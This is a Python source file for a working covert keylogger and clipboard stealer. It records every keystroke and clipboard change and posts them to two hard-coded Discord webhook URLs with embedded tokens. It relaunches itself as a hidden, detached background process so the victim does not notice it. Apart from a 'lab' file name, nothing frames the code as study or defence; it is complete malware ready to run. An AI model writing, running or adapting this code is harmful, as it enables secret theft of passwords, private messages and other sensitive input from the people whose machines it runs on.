import threading
import requests
from pynput import keyboard
import time
import sys
import os
import subprocess
import platform
import clipboard  # changed from pyperclip
import psutil
import signal

# ——— Configuration ——————————————————————————————————————————
KEY_WEBHOOK    = "https://discord.com/api/webhooks/1374531132959363072/G6SAyrzVq6Ns854CP2uyrTuQaWYbEItcNzDH3aZrfcpbxqo-Q8Fntyacc03yE7trnILj"  # keystrokes channel
CLIP_WEBHOOK   = "https://discord.com/api/webhooks/1374531136922845234/ATn7xY64ZMRrZWeXbdnkKOFJkEqxKVd7mPFH2KCdBCbTaEiFyd1XyWOoo7oAiJw73gan"  # clipboard channel
IDLE_DELAY     = 1.0    # secs of typing-idle before sending keystrokes
CLIP_DELAY     = 2.0    # secs of clip-idle before sending clipboard
CHECK_CLIP     = 0.5    # polling interval for clipboard
PID_FILE       = os.path.expanduser("~/.lab_keylogger.pid")

# ——— Global State ——————————————————————————————————————————
keystrokes     = []
lock           = threading.Lock()
last_key_time  = 0.0
last_clip_time = 0.0
last_clip_val  = None
stop_evt       = threading.Event()
data_evt       = threading.Event()

# ——— Singleton / PID file ——————————————————————————————————————
def ensure_singleton():
    pid = None
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, "r") as f:
                pid = int(f.read().strip())
        except Exception:
            pid = None
        if pid and psutil.pid_exists(pid):
            sys.exit()  # another instance is running
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

def cleanup_singleton():
    try:
        os.remove(PID_FILE)
    except Exception:
        pass

# ——— HTTP Post —————————————————————————————————————————————
def post(url, content):
    try:
        requests.post(url, json={"content": content})
    except Exception:
        pass

# ——— Flush Keystrokes ————————————————————————————————————————
def flush_keys():
    global keystrokes
    with lock:
        if not keystrokes:
            return
        payload = "".join(keystrokes)
        keystrokes = []
    post(KEY_WEBHOOK, payload)

# ——— Keystroke Sender Thread ————————————————————————————————————
def key_sender():
    global last_key_time
    while not stop_evt.is_set():
        data_evt.wait(timeout=IDLE_DELAY)
        now = time.time()
        with lock:
            idle = now - last_key_time if last_key_time else None
            has_data = bool(keystrokes)
        if has_data and idle is not None and idle >= IDLE_DELAY:
            flush_keys()
            data_evt.clear()
    flush_keys()

# ——— Clipboard Watcher Thread using clipboard lib ———————————————————
def clip_watcher():
    global last_clip_val, last_clip_time
    while not stop_evt.is_set():
        try:
            clip = clipboard.paste()
        except Exception:
            clip = None
        now = time.time()
        if clip and clip != last_clip_val and (now - last_clip_time) >= CLIP_DELAY:
            last_clip_val = clip
            last_clip_time = now

            max_len = 2000
            if len(clip) > max_len:
                clip = clip[:max_len] + "\n...[truncated]"

            post(CLIP_WEBHOOK, "[CLIPBOARD]\n" + clip)
        time.sleep(CHECK_CLIP)

# ——— Keystroke Listener Callback —————————————————————————————
def on_press(key):
    global last_key_time
    try:
        char = key.char
    except AttributeError:
        key_map = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '[ENTER]',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACK]',
        }
        name = getattr(key, "name", str(key)).upper()
        char = key_map.get(key, f'[{name}]')
    with lock:
        keystrokes.append(char)
        last_key_time = time.time()
    data_evt.set()

# ——— Run Keylogger ————————————————————————————————————————————
def run():
    ensure_singleton()
    # handle termination signals
    signal.signal(signal.SIGTERM, lambda s, f: stop_evt.set())
    signal.signal(signal.SIGINT,  lambda s, f: stop_evt.set())

    # start sender and clipboard threads
    t_keys = threading.Thread(target=key_sender, daemon=True)
    t_clip = threading.Thread(target=clip_watcher, daemon=True)
    t_keys.start()
    t_clip.start()

    # start listener in its own thread
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()

    # wait for stop event
    stop_evt.wait()

    # stop listener and threads
    listener.stop()
    data_evt.set()
    t_keys.join()
    t_clip.join()
    cleanup_singleton()

# ——— Launcher (Hidden Subprocess) —————————————————————————————
def launcher():
    system = platform.system()
    if system == "Windows":
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        flags   = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
        subprocess.Popen([pythonw, __file__, "run"], creationflags=flags, close_fds=True)
    else:
        subprocess.Popen([sys.executable, __file__, "run"],
                         preexec_fn=os.setpgrp, close_fds=True)

# ——— Entry Point ————————————————————————————————————————————
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        run()
    else:
        launcher()
